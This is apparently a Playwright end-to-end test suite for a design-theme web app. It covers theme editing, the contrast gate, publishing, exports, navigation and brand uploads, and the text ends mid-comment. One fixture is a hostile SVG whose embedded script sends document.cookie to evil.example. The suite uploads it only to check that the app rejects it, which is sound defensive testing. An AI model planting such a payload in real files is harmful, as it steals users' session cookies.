/**
 * The app, end to end, through a browser.
 *
 * The unit suite drives the theme lifecycle directly against a real MongoDB and
 * proves the *rules*. What it cannot see is whether a person can reach them:
 * every one of those functions was correct and unreachable at some point in
 * this project's history — `nearestPassing`, `checkFont`, `rollbackTheme` — and
 * a screen that renders the word "Override" as a `<span>` passes every unit
 * test ever written about overrides.
 *
 * So this suite asserts reachability. Sign in, change a colour, break it, be
 * refused, fix it with the offered suggestion, publish, and fetch the
 * stylesheet a browser would fetch. If any step in that chain stops being
 * possible, this fails even though nothing underneath it changed.
 */

import { test, expect, type Page } from "@playwright/test";

const BASE = process.env.ZOBLOCKS_APP_URL ?? "http://localhost:6003";

/** The seed's worked customer. Obviously fake, in a database that evaporates. */
const ADMIN = { email: "admin@northwind.example", password: "correct-horse-battery-staple" };
const THEME = "northwind-clinical";

async function signIn(page: Page, who = ADMIN) {
  await page.goto(`${BASE}/login`);
  await page.getByLabel("Email", { exact: true }).fill(who.email);
  await page.getByLabel("Password", { exact: true }).fill(who.password);
  await page.getByRole("button", { name: "Sign in", exact: true }).click();
  await expect(page).toHaveURL(/\/themes$/);
}

/**
 * The hex field of one semantic token row, which is the real control.
 *
 * Located by its accessible name rather than by position. Writing this test is
 * what revealed those fields had none: eighty unlabelled text boxes in a list,
 * with the token name rendered beside them as decoration. `ColorField` now
 * takes a `label`, so this locator and a screen reader find the same thing.
 */
function tokenField(page: Page, path: string) {
  return page.getByLabel(path, { exact: true });
}

test.describe("@app the theme lifecycle", () => {
  test("signs in, edits a token, is refused, fixes it, publishes, and serves it", async ({
    page,
    request,
  }) => {
    await signIn(page);

    /* --- the rail is real navigation, not decoration -------------------- */
    await page.getByRole("link", { name: "Themes", exact: false }).first().click();
    await page.getByRole("link", { name: "Northwind Health Clinical" }).click();
    await expect(page.getByRole("heading", { level: 1 })).toHaveText("Northwind Health Clinical");

    /* --- edit a token --------------------------------------------------- */
    await page.goto(`${BASE}/themes/${THEME}/tokens`);
    await page.getByRole("button", { name: /^text/ }).click();

    const text = tokenField(page, "text");
    await text.fill("#d8dee6");

    /*
     * The gate, live in the browser, before anything is saved.
     *
     * This is the assertion that matters most on this screen: the number is
     * computed by the same function the build's gate calls, so a customer is
     * never told one thing here and another in CI.
     */
    await expect(page.getByText(/below the 4.5:1 floor/)).toBeVisible();

    /* --- the route out -------------------------------------------------- */
    const suggestion = page.getByRole("button", { name: /Apply nearest passing/ });
    await expect(suggestion).toBeVisible();
    await suggestion.click();

    // The failure is gone and the field shows the shade that was applied.
    await expect(page.getByText(/below the 4.5:1 floor/)).toHaveCount(0);
    await expect(text).not.toHaveValue("#d8dee6");

    /* --- save, and be told what happened -------------------------------- */
    await page.getByRole("button", { name: "Save overrides" }).click();

    // The toast is the announcement. It is scoped explicitly because the same
    // sentence also renders inline beneath the form — that duplication is the
    // point, not an accident: one tells you it happened, the other is what you
    // work from.
    await expect(page.getByRole("status").getByText(/Saved \d+ override/)).toBeVisible();

    /* --- publish --------------------------------------------------------- */
    await page.goto(`${BASE}/themes/${THEME}`);
    await page.getByRole("button", { name: "Publish" }).click();

    // Specifically in the toast: this confirmation used to render only inline,
    // in a 22rem column in the page header, where it was easy to miss.
    await expect(page.getByRole("status")).toContainText(/^Published v\d+\./);

    /* --- and the bytes a browser actually fetches ------------------------ */
    const href = await page
      .locator("code")
      .filter({ hasText: /^\/t\// })
      .first()
      .textContent();
    expect(href).toMatch(/^\/t\/northwind\/northwind-clinical@\d+\.css$/);

    const css = await request.get(`${BASE}${href}`);
    expect(css.ok()).toBe(true);
    expect(css.headers()["cache-control"]).toContain("immutable");
    expect(css.headers()["content-type"]).toContain("text/css");

    const body = await css.text();
    expect(body).toContain("--zb-text:");
    // The rule that survives every tier and every screen.
    expect(body).not.toContain("--zb-status-");
    expect(body).not.toContain("--zb-flag-");

    /*
     * The brand manifest, at the version just published.
     *
     * Asserted here rather than in its own test because it can only be
     * asserted after a publish, and a test that depends on some *other* spec
     * having published first passes or fails on worker ordering — which is not
     * a flake to retry around, it is the test not testing what it claims to.
     *
     * Everything CSS cannot deliver lives here: alternative text for a mark a
     * host renders as a real `<img>`, the favicon and link-preview card CSS
     * never draws, and absolute URLs that survive being pasted into an email.
     */
    const manifest = await request.get(`${BASE}${href}`.replace(/\.css$/, ".json"));
    expect(manifest.status()).toBe(200);

    const brand = await manifest.json();
    expect(brand.slug).toBe(THEME);
    // Names the stylesheet it belongs with, so a host cannot pin artwork from
    // one version against tokens from another.
    expect(brand.stylesheet).toBe(`${BASE}${href}`);
    expect(Array.isArray(brand.assets)).toBe(true);

    for (const asset of brand.assets) {
      // Absolute. A relative path resolves against the host's own origin,
      // which is not where the artwork lives — fine in the app, useless in
      // an email that Outlook renders three days later.
      expect(asset.href, asset.role).toMatch(/^https?:\/\//);
      expect(typeof asset.alt, asset.role).toBe("string");
    }
  });
});

test.describe("@app the component tier", () => {
  /**
   * The screen that let somebody change fifty-five switch tokens and showed
   * them fifty-five text fields.
   *
   * A hex in a box is not a switch, and the claim the component tier exists to
   * support — that you can restyle one component without touching the others —
   * is a claim about what things look like. It can only be settled by looking,
   * so this asserts that a real component is on screen and that typing into a
   * row reaches it.
   */
  test("draws the component being edited, under the edits", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes/${THEME}/components?c=switch`);

    const preview = page.getByRole("region", {
      name: "switch rendered under the draft theme",
    });
    await expect(preview).toBeVisible();

    /*
     * All three values, because the third is the component's entire clinical
     * contribution and the one most likely to be styled badly.
     *
     * `exact`, because each label also appears inside the accessible name of
     * the switch's keyboard-operable button — "Record off for Advance
     * directive" — and a loose match finds both.
     */
    await expect(preview.getByText("Contact precautions", { exact: true })).toBeVisible();
    await expect(preview.getByText("Advance directive", { exact: true })).toBeVisible();
    await expect(preview.getByText("Research consent", { exact: true })).toBeVisible();
  });

  /**
   * A component with no specimen says so, rather than showing an empty box.
   *
   * Only components the app's own dependencies export can be drawn. An
   * absent preview and a broken one look identical unless one of them
   * explains itself, and this screen has shipped a silent blank before.
   */
  test("says which components it cannot draw, instead of showing nothing", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes/${THEME}/components?c=tabs`);

    await expect(page.getByText("No live specimen for tabs")).toBeVisible();
    // And it still lists what it can draw, so the message is useful.
    await expect(page.getByText(/switch, timeline, accordion, loader/)).toBeVisible();
  });
});

test.describe("@app the glyphs", () => {
  const GLYPH = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor">' +
      '<path d="M4 12h16M12 4v16"/></svg>',
  );

  /**
   * A whole set at once, matched by filename.
   *
   * The bulk path is the reason this takes a list: a design team delivers icons
   * as a folder, and twenty-nine separate uploads is a feature somebody uses
   * once and abandons. A file matching no slot is reported rather than dropped,
   * because silently ignoring it leaves them looking at an unchanged toolbar
   * convinced the upload worked.
   */
  test("takes a folder of glyphs and names the ones it could not place", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes/${THEME}/icons`);

    const panel = page.locator("section", {
      has: page.getByRole("heading", { name: "Glyphs" }),
    });

    await panel.getByLabel("SVG files").setInputFiles([
      { name: "send.svg", mimeType: "image/svg+xml", buffer: GLYPH },
      { name: "close.svg", mimeType: "image/svg+xml", buffer: GLYPH },
      { name: "arrow-right.svg", mimeType: "image/svg+xml", buffer: GLYPH },
    ]);
    await panel.getByRole("button", { name: "Upload" }).click();

    await expect(panel.getByText(/2 glyphs replaced/)).toBeVisible();
    // Named, not silently dropped.
    await expect(panel.getByText(/arrow-right\.svg \(no slot with that name\)/)).toBeVisible();

    // And the property is actually set on the cell, which is the same property
    // that changes the copilot — the grid draws the feature, not a picture of it.
    const send = panel.locator('[data-icon="send"]').first();
    await expect(send).toBeVisible();
    const applied = await send.evaluate((el) =>
      getComputedStyle(el.parentElement!).getPropertyValue("--zb-icon-send").trim(),
    );
    expect(applied).toMatch(/^url\(/);

    await panel
      .locator("div", { hasText: /^Send/ })
      .getByRole("button", { name: "Revert" })
      .first()
      .click();
  });

  /**
   * The locked marks, shown and refused.
   *
   * The switch's `unknown` glyph is that component's whole clinical
   * contribution — a binary control cannot tell "no" from "nobody asked" — so
   * it is not on offer. Shown rather than hidden, with the reason, because a
   * refusal nobody can see reads as a missing feature.
   */
  test("shows the marks it will not replace, and why", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes/${THEME}/icons`);

    const locked = page.locator("section", {
      has: page.getByRole("heading", { name: "Not on offer" }),
    });
    await expect(locked.getByText("Switch · unknown")).toBeVisible();
    await expect(locked.getByText(/nobody asked/)).toBeVisible();

    // And it is not offered for upload anywhere on the screen.
    await expect(page.locator('[data-icon="switch-unknown"]')).toHaveCount(0);
  });
});

/*
 * Serial, because these two mutate the same organisation-level setting.
 *
 * `org.frameworks` is one row shared by every spec in this file, so running
 * these in parallel had one test enabling both frameworks while the other
 * asserted that exactly one was offered. That is not flakiness to retry around
 * — it is two tests describing incompatible worlds and taking turns winning.
 */
test.describe.serial("@app the frameworks setting", () => {
  /**
   * Save, and wait for the server to say it saved.
   *
   * Clicking Save and navigating immediately is a race the test loses roughly
   * one run in four: the action is still in flight when the next page renders,
   * so the export list is built from the *previous* selection. The count beside
   * the button — "1 of 2 enabled" — is client state that updates on click and
   * is therefore not a signal that anything reached the database.
   *
   * The action's own confirmation is, because it is returned by the server
   * after the write.
   */
  const save = async (page: Page) => {
    await page.getByRole("button", { name: "Save selection" }).click();
    await expect(
      /*
        Any of the three things the server can say, unanchored.

        "No change." is a real outcome here rather than a failure: the checkbox
        clicks are guarded, so a run that finds the state already correct saves
        nothing — and a wait that only accepted the success wording hung for
        five seconds and then failed on a save that had worked perfectly.
      */
      // `.first()`, because the outcome is deliberately in two places: the
      // inline result beside the button, and the live region that announces it.
      page.getByText(/app now offers|No change|No framework selected/).first(),
    ).toBeVisible();
  };

  /*
   * And both are put back afterwards, so a spec that merely *reads* this screen
   * finds the state the seed produced rather than whatever ran last.
   */
  test.afterAll(async ({ browser }) => {
    const page = await browser.newPage();
    await signIn(page);
    await page.goto(`${BASE}/frameworks`);
    for (const name of [/Ant Design/, /Material UI/]) {
      const box = page.getByRole("checkbox", { name });
      if (!(await box.isChecked())) await box.click();
    }
    await save(page);
    await page.close();
  });

  /**
   * The setting that used to do nothing.
   *
   * It was written to the organisation and read by the badge counter beside
   * "Frameworks" in the rail — and nowhere else — while the screen's own
   * callout claimed it selected which bridge the preview rendered through and
   * which imports were accepted. Neither was wired. This asserts the one thing
   * it now genuinely decides, in both directions, because a preference that
   * only ever adds is a preference nobody can tell is working.
   */
  test("decides which framework exports are offered, and says what it withheld", async ({
    page,
  }) => {
    await signIn(page);

    // Enable only Ant Design.
    await page.goto(`${BASE}/frameworks`);
    const mui = page.getByRole("checkbox", { name: /Material UI/ });
    if (await mui.isChecked()) await mui.click();
    const antd = page.getByRole("checkbox", { name: /Ant Design/ });
    if (!(await antd.isChecked())) await antd.click();
    await save(page);

    await page.goto(`${BASE}/themes/${THEME}/transfer`);
    await expect(page.getByRole("heading", { name: "antd ConfigProvider" })).toBeVisible();
    await expect(page.getByRole("heading", { name: "MUI createTheme" })).toHaveCount(0);

    // Withheld, not silently absent — a format that vanishes reads as a
    // product that lost a feature.
    await expect(page.getByText(/MUI createTheme is hidden because/)).toBeVisible();

    // And the reverse, so this cannot pass by hiding everything.
    await page.goto(`${BASE}/frameworks`);
    await page.getByRole("checkbox", { name: /Material UI/ }).click();
    await save(page);

    await page.goto(`${BASE}/themes/${THEME}/transfer`);
    await expect(page.getByRole("heading", { name: "MUI createTheme" })).toBeVisible();
  });

  /*
   * That the export carries the *resolved* accent rather than the swatch the
   * customer typed is asserted in `apps/app/test/transfer.test.ts`, where
   * the generated file can be read. A browser test could only click Copy and
   * believe it — which is a test that passes whatever the file says.
   */

  /**
   * The download, rendered in the framework's own components.
   *
   * A theme file is a claim that a brand survived translation into somebody
   * else's vocabulary, and the only way to settle it is to look at *their*
   * Button. So this reads the painted colour off a real antd primary button and
   * checks it against the accent ZoBlocks resolves — if the mapping table drifts,
   * or the specimen quietly renders unthemed, the pixel disagrees.
   */
  test("draws the export in the framework's own components", async ({ page }) => {
    await signIn(page);

    await page.goto(`${BASE}/frameworks`);
    const antd = page.getByRole("checkbox", { name: /Ant Design/ });
    if (!(await antd.isChecked())) await antd.click();
    await save(page);

    await page.goto(`${BASE}/themes/${THEME}/transfer`);

    // Loaded with `ssr: false`, so it arrives after hydration rather than in
    // the first HTML — antd and MUI must not be evaluated in the request path.
    const admit = page.getByRole("button", { name: "Admit" }).first();
    await expect(admit).toBeVisible({ timeout: 25000 });

    const painted = await admit.evaluate((el) => getComputedStyle(el).backgroundColor);

    // #1851a5 — the ramp's 700, which is what `--zb-accent` resolves to. The
    // 600 the customer picked would be rgb(29, 99, 201).
    expect(painted).toBe("rgb(24, 81, 165)");
  });
});

test.describe("@app what no role may do", () => {
  /**
   * The negative path, which is the one worth automating.
   *
   * A gate that has never been observed refusing anything is a gate nobody has
   * evidence for. This drives a theme into a failing state and asserts that
   * publish is refused *with the reason*, rather than silently doing nothing.
   */
  test("refuses to publish a failing theme, and says why", async ({ page }) => {
    await signIn(page);

    // Southmere's theme, so this test cannot fight the one above over Northwind.
    await page.goto(`${BASE}/themes`);
    const rows = page.getByRole("row");
    await expect(rows.first()).toBeVisible();

    await page.goto(`${BASE}/themes/${THEME}/tokens`);
    await page.getByRole("button", { name: /^text/ }).click();
    await tokenField(page, "text").fill("#f4f6f8");

    // Refused at save, not deferred to publish — a draft a customer believes is
    // fine and discovers is not at the moment they want it is worse.
    await page.getByRole("button", { name: "Save overrides" }).click();

    // A failure takes the alert role and does not auto-dismiss: it is something
    // to read and act on, not something to catch before it fades.
    // Filtered by text, because the live preview on this screen renders real
    // `Switch` components and each of those carries its own (empty) alert
    // region — the library doing the right thing, which a bare role lookup
    // cannot tell apart from ours.
    await expect(page.getByRole("alert").filter({ hasText: /cannot be saved/ })).toBeVisible();

    // And the detail stays inline, where it can be worked from — naming the
    // pair, the measured ratio and the criterion.
    await expect(page.getByRole("main").getByText(/cannot be saved/)).toBeVisible();
    await expect(
      page
        .getByRole("main")
        .getByText(/SC 1\.4\.3/)
        .first(),
    ).toBeVisible();
  });

  test("a clinical token has no editable control at all", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes/${THEME}/tokens`);
    await page.getByRole("button", { name: /^status/ }).click();

    // Shown, locked, and with the reason reachable — never hidden.
    const row = page
      .getByRole("listitem")
      .filter({ has: page.locator("code", { hasText: /^status\.critical$/ }) });
    await expect(row).toBeVisible();
    await expect(row.getByText(/Clinical\./)).toBeVisible();
    await expect(row.getByRole("textbox")).toHaveAttribute("readonly", "");
  });
});

test.describe("@app the broken link that started this", () => {
  test("every primary navigation item resolves", async ({ page }) => {
    await signIn(page);

    const targets = [
      "/themes",
      "/frameworks",
      "/members",
      "/settings",
      "/playground",
      "/market",
      "/market/purchases",
      "/market/tokens",
      `/themes/${THEME}`,
      `/themes/${THEME}/brand`,
      `/themes/${THEME}/tokens`,
      `/themes/${THEME}/typography`,
      `/themes/${THEME}/components`,
      `/themes/${THEME}/compare`,
      `/themes/${THEME}/history`,
      `/themes/${THEME}/transfer`,
    ];

    for (const target of targets) {
      const response = await page.goto(`${BASE}${target}`);
      expect(response?.status(), `${target} should not 404`).toBeLessThan(400);
      // A rendered heading, not just a 200 — an error boundary also returns 200.
      await expect(page.getByRole("heading", { level: 1 }), target).toBeVisible();
    }
  });
});

test.describe("@app the theme list", () => {
  /**
   * Search and sort are held in the URL, not in component state. That is what
   * makes a filtered list a link somebody can send — and it is what these
   * assertions are really checking: the page renders the query, rather than
   * the browser filtering rows it was already given.
   *
   * Counts are read from the page rather than written here. The seed owns how
   * many themes exist, and a test that hard-codes two starts failing the day
   * somebody seeds a third — which says nothing about whether search works.
   */
  test("filters by name and by address, and says how many matched", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes`);

    const rows = page.locator("tbody tr");
    const total = await rows.count();
    expect(total).toBeGreaterThan(0);

    // By name.
    await page.getByRole("searchbox").fill("Northwind");
    await page.getByRole("searchbox").press("Enter");
    await expect(page).toHaveURL(/[?&]q=Northwind/);
    await expect(page.getByRole("link", { name: "Northwind Health Clinical" })).toBeVisible();

    // By slug, which is the address an application links and the reason the
    // column exists at all.
    await page.goto(`${BASE}/themes?q=${THEME}`);
    await expect(page.getByRole("link", { name: "Northwind Health Clinical" })).toBeVisible();
  });

  test("offers a way back when a search matches nothing", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes`);
    const total = await page.locator("tbody tr").count();

    await page.goto(`${BASE}/themes?q=no-such-theme`);
    await expect(page.locator("tbody tr")).toHaveCount(0);

    // Not the "create your first theme" state — that would be the app
    // telling somebody who mistyped the wrong thing about their own data.
    await expect(page.getByText(/Nothing matches/)).toBeVisible();
    await page.getByRole("link", { name: "Clear search" }).click();
    await expect(page.locator("tbody tr")).toHaveCount(total);
  });

  test("sorts by a column, and only that column reports being sorted", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes?sort=name&dir=asc`);

    const names = await page.locator("tbody tr td:first-child a").allInnerTexts();
    expect(names).toEqual([...names].sort((a, b) => a.localeCompare(b)));

    // `aria-sort` is what a screen reader announces; the arrow is decoration.
    // Two columns claiming to be sorted is the same as none.
    await expect(page.getByRole("columnheader", { name: /Theme/ })).toHaveAttribute(
      "aria-sort",
      "ascending",
    );
    expect(await page.locator("thead th[aria-sort]").count()).toBe(1);
  });

  test("copies the stylesheet URL straight from the row", async ({ page, context }) => {
    await context.grantPermissions(["clipboard-read", "clipboard-write"]);
    await signIn(page);
    await page.goto(`${BASE}/themes`);

    await page
      .getByRole("button", { name: /Copy CSS URL/ })
      .first()
      .click();

    // The version-pinned URL, which is the one thing a developer comes to this
    // screen for and the one thing it never used to show.
    const copied = await page.evaluate(() => navigator.clipboard.readText());
    expect(copied).toContain(`/t/northwind/${THEME}@`);
    expect(copied).toMatch(/@\d+\.css$/);
  });
});

test.describe("@app getting from a theme to its screens", () => {
  /**
   * The journey this exists to protect: list → theme → a working screen,
   * without touching the rail.
   *
   * Before the theme page carried its own navigation, the only route to the
   * token editor was noticing that the sidebar had grown once you were already
   * on a theme URL. Driving it through the rail would pass either way, so this
   * scopes every click to the page's own grid.
   */
  test("reaches every theme screen from the theme page itself", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes`);
    await page.getByRole("link", { name: "Northwind Health Clinical" }).click();
    await expect(page).toHaveURL(new RegExp(`/themes/${THEME}$`));

    const grid = page.getByRole("navigation", { name: "This theme" });
    const links = grid.getByRole("link");

    const screens = [
      ["Brand", "brand"],
      ["Tokens", "tokens"],
      ["Typography", "typography"],
      ["Components", "components"],
      ["Icons", "icons"],
      ["Compare", "compare"],
      ["History", "history"],
      ["Import / export", "transfer"],
    ] as const;

    // Counted from the list below rather than written twice: the two went out
    // of step the first time a screen was added, and the number is not the
    // thing worth protecting — that every screen listed is reachable is.
    await expect(links).toHaveCount(screens.length);

    for (const [label, segment] of screens) {
      await page.goto(`${BASE}/themes/${THEME}`);
      await grid.getByRole("link", { name: new RegExp(`^${label}`) }).click();

      await expect(page).toHaveURL(`${BASE}/themes/${THEME}/${segment}`);
      // Arrived somewhere real, not at an error boundary or a blank shell.
      await expect(page.getByRole("heading", { level: 1 })).toBeVisible();
    }
  });

  /**
   * The cards state what is waiting, which is what makes this a status board
   * rather than a menu.
   *
   * Asserted as relationships rather than as values. These specs share one
   * database and the lifecycle test both edits a token and publishes against
   * this same theme — so "1 version" or "Using the defaults" pass or fail
   * depending on which worker arrived first. A test that depends on another
   * test's side effects is not testing what it claims to. What is always true
   * is that the numbers are read from the theme and agree with each other.
   */
  test("states what each screen currently holds", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes/${THEME}`);

    const grid = page.getByRole("navigation", { name: "This theme" });

    // Shape, not value: the ramp is eleven steps whatever is set in them.
    await expect(grid.getByText(/^\d+ of 11 steps set$/)).toBeVisible();

    // The invariant worth protecting: Compare's precondition follows History's
    // count, so the two cards can never contradict each other.
    const history = await grid.getByText(/^\d+ versions?$/).innerText();
    const versions = Number(/^(\d+)/.exec(history)![1]);
    const compare = await grid
      .getByText(/Needs a second version|\d+ versions to compare/)
      .innerText();

    if (versions >= 2) {
      expect(compare).toBe(`${versions} versions to compare`);
    } else {
      expect(compare).toBe("Needs a second version");
    }

    /*
     * And every card says something.
     *
     * Asserted against the number of cards rather than a literal — the literal
     * went stale the first time a screen was added, and "some cards have text"
     * is not the property worth holding. A card with nothing under its title is
     * a status board with a hole in it.
     */
    const cards = await grid.locator("a").count();
    const stated = await grid.locator("a").filter({ hasText: /\S/ }).count();
    expect(stated).toBe(cards);
  });
});

test.describe("@app when there is nothing there", () => {
  /**
   * Seven screens call `notFound()` for a theme slug that does not resolve.
   * Every one of them was correct and every one of them rendered Next's
   * unstyled default, because the app had no `not-found.tsx` anywhere — the
   * call was right, there was simply nowhere for it to land.
   */
  test("a missing theme keeps you inside the app", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes/no-such-theme`);

    await expect(page.getByRole("heading", { name: /nothing at this address/i })).toBeVisible();

    /*
     * Deliberately not asserting a 404 status here.
     *
     * This route streams, so the response committed `200` before the theme was
     * looked up — Next's own documentation is explicit that the status cannot
     * change once streaming has started, and that it injects `noindex` instead.
     * That tag is the actual contract protecting a soft 404 from being indexed,
     * so it is the thing worth testing. Asserting 404 would be asserting a
     * guarantee the framework does not make.
     */
    const robots = page.locator('meta[name="robots"]');
    await expect(robots.first()).toBeAttached();
    // Every one of them, not just the first: the app sets its own
    // `noindex, nofollow, nocache` globally and Next adds its own on top, so
    // the property worth holding is that none of them invites indexing.
    for (const tag of await robots.all()) {
      expect(await tag.getAttribute("content")).toMatch(/noindex/);
    }

    // The rail survives, which is the reason this boundary sits inside the
    // group rather than at the root: the way out is one click, not the back
    // button.
    await expect(page.getByRole("navigation", { name: "App" })).toBeVisible();
    await page.getByRole("link", { name: "Back to themes" }).click();
    await expect(page).toHaveURL(`${BASE}/themes`);
  });

  test("an address that matches no route at all is still ours", async ({ page }) => {
    const response = await page.goto(`${BASE}/not-a-route`);

    expect(response?.status()).toBe(404);
    await expect(page.getByRole("heading", { name: /nothing at this address/i })).toBeVisible();
    // No session is assumed out here, so the only offered destination is one
    // that works whether or not you have an account.
    await expect(page.getByRole("link", { name: "Go to the app" })).toBeVisible();
  });
});

/**
 * Arriving at an authenticated page with no session.
 *
 * Every one of these pages used to open with `const member = (await
 * currentMember())!`. The assertion was wrong and the pages worked anyway: the
 * layout's redirect won the race, so the reader landed on `/login` while the
 * server logged `Cannot read properties of null (reading 'orgId')` behind them
 * — 38 times in one run of this suite.
 *
 * **These would not have caught that, and it is worth knowing why.** Run
 * against the old code they still pass, five for five — while the server logs
 * exactly five dereferences, one per request. The bug was never visible from
 * the browser, so no assertion made through one can reach it; `requireMember`'s
 * unit tests are what guard it, and this file cannot.
 *
 * What this file does cover is a path that had none. Nothing anywhere drove an
 * authenticated route without a cookie, which is how twenty pages could carry a
 * broken guard while every suite stayed green. A redirect nobody exercises is
 * indistinguishable from a redirect that works.
 *
 * Four routes rather than all twenty, because four is what the rewrite actually
 * varied: a plain page, a settings page, one nested under a dynamic segment,
 * and one under `/market`.
 */
test.describe("@app the door, when you have no key", () => {
  for (const path of ["/themes", "/settings", "/themes/northwind-clinical/tokens", "/market"]) {
    test(`${path} sends you to sign in rather than failing`, async ({ page }) => {
      // No `signIn` above this line, deliberately — the whole point is the
      // request that arrives without one.
      const response = await page.goto(`${BASE}${path}`);

      await expect(page).toHaveURL(/\/login$/);

      /*
       * The status matters as much as the URL. A page that threw and a page
       * that redirected both end up here — the first through an error boundary
       * — and only the status tells them apart. This is the assertion the old
       * code would have had to earn rather than inherit.
       */
      expect(response?.status()).toBe(200);
      await expect(page.getByRole("button", { name: "Sign in", exact: true })).toBeVisible();
    });
  }

  /**
   * The way back in still works from there. A redirect that lands on a broken
   * form is not a fix, and the sign-in page is reached by a route the previous
   * tests never exercise: as a redirect target rather than a direct visit.
   */
  test("and signing in from there reaches the app", async ({ page }) => {
    await page.goto(`${BASE}/settings`);
    await expect(page).toHaveURL(/\/login$/);

    await page.getByLabel("Email", { exact: true }).fill(ADMIN.email);
    await page.getByLabel("Password", { exact: true }).fill(ADMIN.password);
    await page.getByRole("button", { name: "Sign in", exact: true }).click();

    await expect(page).toHaveURL(/\/themes$/);
    await expect(page.getByRole("navigation", { name: "App" })).toBeVisible();
  });
});

test.describe("@app brand artwork", () => {
  /**
   * The upload is a security boundary, so it is tested through the boundary.
   *
   * `checkLogo` has a unit test per attack rule and all of them pass. That
   * proves the function refuses; it does not prove the function is *called*.
   * Between the file picker and the digest there is a server action, a
   * multipart parse and a byte conversion, and a logo feature that stores the
   * file first and validates it afterwards passes every unit test ever written
   * about validation.
   *
   * So this drives the actual picker with an actual hostile file, and asserts
   * the person is told what was wrong with it rather than being handed
   * "something went wrong".
   */
  /*
   * Anchored on the visible heading rather than a test id. `Panel` renders an
   * unnamed `<section>`, which is deliberately not a landmark — naming all
   * fourteen of them would put fourteen regions in a screen reader's landmark
   * list, which is worse than none.
   */
  const brandPanel = (page: Page) =>
    page.locator("section", { has: page.getByRole("heading", { name: "Brand assets" }) });

  /*
   * One slot, by its own label.
   *
   * These specs share a database and run concurrently, so a locator scoped to
   * the whole panel finds whatever another worker uploaded a second ago. That
   * is not a flake to retry around — it is the test asserting about the wrong
   * element, which would pass just as readily when the code is broken.
   */
  const slot = (page: Page, label: string) =>
    brandPanel(page).locator("div.surface").filter({ hasText: label }).first();

  const HOSTILE = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">' +
      '<script>fetch("https://evil.example/?c="+document.cookie)</script>' +
      "<circle cx='12' cy='12' r='10'/></svg>",
  );

  /**
   * A genuine PNG header at 1200×1200, so the dimension reader is exercised
   * rather than mocked. Nothing decodes the pixels; only IHDR is read.
   */
  const squarePng = (() => {
    const b = Buffer.alloc(64);
    b.set([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    b.writeUInt32BE(13, 8);
    b.write("IHDR", 12, "ascii");
    b.writeUInt32BE(1200, 16);
    b.writeUInt32BE(1200, 20);
    return b;
  })();

  /**
   * A wordmark with a distinct square symbol on the left, which is the shape
   * the leading crop exists for.
   */
  const WORDMARK = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 80" width="320" height="80">' +
      '<rect width="80" height="80" rx="16" fill="#1D63C9"/>' +
      '<text x="98" y="52" font-family="sans-serif" font-size="30" fill="#0F356B">Northwind</text>' +
      "</svg>",
  );

  const CLEAN = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 32">' +
      '<rect width="120" height="32" rx="6" fill="#0F5A64"/>' +
      '<text x="12" y="21" font-family="sans-serif" font-size="13" fill="#fff">Northwind</text>' +
      "</svg>",
  );

  test("refuses artwork that can execute, and says what it found", async ({ page }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes/${THEME}/brand`);

    const panel = brandPanel(page);
    await expect(panel).toBeVisible();

    await panel.getByLabel("Asset").selectOption("mark-light");
    await panel.getByLabel("File").setInputFiles({
      name: "logo.svg",
      mimeType: "image/svg+xml",
      buffer: HOSTILE,
    });
    await panel.getByRole("button", { name: "Upload" }).click();

    // Names the element, not "invalid file" — a designer has to be able to act
    // on this, and the action is almost always a different export setting.
    await expect(panel.getByText(/contains a <script> element/)).toBeVisible();

    // And it was refused, not stored and then flagged. Scoped to the slot it
    // was aimed at, because another worker may legitimately be filling others.
    await expect(slot(page, "Mark, on light").getByText("Nothing uploaded")).toBeVisible();
  });

  /**
   * The registry is the screen, so the screen proves the registry reached it.
   *
   * Seven slots, not three: the moment you ask what else a hospital needs
   * beyond a wordmark, the answer is a favicon, a home-screen icon, a card for
   * the link somebody pastes into Teams, and a raster mark for the appointment
   * reminder — and the point of holding them in one table is that this test
   * fails the day somebody adds the eighth without wiring it up.
   */
  test("offers every asset a tenant actually needs, grouped by what renders it", async ({
    page,
  }) => {
    await signIn(page);
    await page.goto(`${BASE}/themes/${THEME}/brand`);

    const panel = brandPanel(page);
    for (const group of [
      "The mark",
      "Platform icons",
      "Outside the application",
      "On paper",
      "Empty and error states",
    ]) {
      await expect(panel.getByRole("heading", { name: group })).toBeVisible();
    }

    // Each slot says what it takes and where it ends up, on the slot — so
    // nobody has to read documentation to learn the touch icon is 180×180.
    await expect(panel.getByText("180×180 exactly")).toBeVisible();
    await expect(panel.getByText("apple-touch-icon", { exact: false })).toBeVisible();
    await expect(panel.getByText("og:image", { exact: false })).toBeVisible();

    /*
     * An illustration is previewed on both grounds at once — one file has to
     * survive light and dark, and a drawing with a baked white background
     * looks perfect on the light swatch and is a white rectangle in the dark
     * theme. Asserted by the pair of captions, which only that layout renders.
     */
    const empty = slot(page, "Nothing here yet");
    await expect(empty.getByText("On light")).toBeVisible();
    await expect(empty.getByText("On dark")).toBeVisible();

    /*
     * The upload offers exactly as many roles as there are slots on screen.
     *
     * Asserted as an invariant between the two views rather than against a
     * number, because a literal goes stale the next time a row is added — which
     * it did, one commit after this test was written. Both views read the same
     * registry, so a role that gains a card and not an option, or the reverse,
     * is the failure worth catching; the count itself is not.
     */
    const slots = await panel.locator("div.surface").count();
    expect(slots).toBeGreaterThan(6);
    await expect(panel.getByLabel("Asset").getByRole("option")).toHaveCount(slots);
  });

  /**
   * A shape problem is reported and the file is still stored.
   *
